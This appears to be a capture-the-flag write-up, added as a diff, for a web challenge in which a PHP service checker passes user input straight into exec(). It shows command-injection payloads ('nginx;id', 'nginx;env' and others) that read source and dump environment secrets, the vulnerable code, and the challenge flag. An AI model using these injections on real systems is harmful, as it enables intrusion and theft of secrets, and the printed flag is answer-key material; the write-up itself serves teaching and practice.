@@ -1,0 +1,102 @@
+Checkup — Web 
+
+Challenge Description
+
+The application displays a simple Service Checker page with a dropdown containing the following services:
+
+nginx
+
+apache2
+
+mysql
+
+The goal is to retrieve the flag from the server.
+
+Initial Recon
+
+The functionality suggests that the backend checks the status of a selected service by executing a system command based on user input.
+
+Request Analysis
+
+Intercepting the request with Burp Suite shows the following:
+
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+service=nginx
+
+The service parameter is directly controlled by the user.
+
+Vulnerability Discovery
+
+Testing for command injection by appending a command separator:
+
+service=nginx;id
+
+Response:
+
+uid=33(www-data) gid=33(www-data)
+
+This confirms a Command Injection vulnerability.
+
+Source Code Disclosure
+
+Reading the application source code:
+
+service=nginx;cat index.php
+
+Reveals:
+
+$cmd = "ping -c1 -W1 " . $service . " 2>&1";
+exec($cmd, output: $output, result_code: $returnCode);
+
+User input is directly concatenated into exec() without sanitization.
+
+Enumeration
+
+Listing files in the current directory:
+
+service=nginx;ls -la
+
+Output:
+
+index.php
+static/
+
+Enumerating the parent directory:
+
+service=nginx;ls -la ..
+Flag Discovery
+
+Dumping environment variables:
+
+service=nginx;env
+
+Output includes:
+
+FLAG=FahemSec{C0mm4nd_1nj3ct10n_4_73_c00l_471241f124} 
+Result
+
+The flag is successfully retrieved:
+
+FahemSec{C0mm4nd_1nj3ct10n_4_73_c00l_471241f124} 
+
+Root Cause
+
+The vulnerability is caused by unsafe usage of:
+
+exec("ping -c1 -W1 " . $service)
+
+Without:
+
+Input validation
+
+escapeshellarg()
+
+Command whitelisting
+
+Exploitation Payloads
+
+Confirm injection:
+
+nginx;env
